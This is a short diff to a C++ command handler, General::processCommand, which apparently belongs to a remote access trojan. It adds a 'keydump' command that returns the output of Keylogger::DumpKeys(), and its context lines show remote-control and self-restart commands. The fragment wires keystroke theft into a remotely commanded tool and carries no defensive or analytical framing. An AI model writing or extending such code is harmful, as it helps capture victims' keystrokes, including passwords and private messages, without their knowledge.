@@ -271,6 +271,11 @@ std::string General::processCommand(std::string command)
 		restartSelf();
 		return "restarting";
 	}
+
+	else if (command == "keydump")
+	{
+		return Keylogger::DumpKeys();
+	}
 	else if (processParameter(command, "remoteControl"))
 	{
 		if (!CMD::cmdOpen)
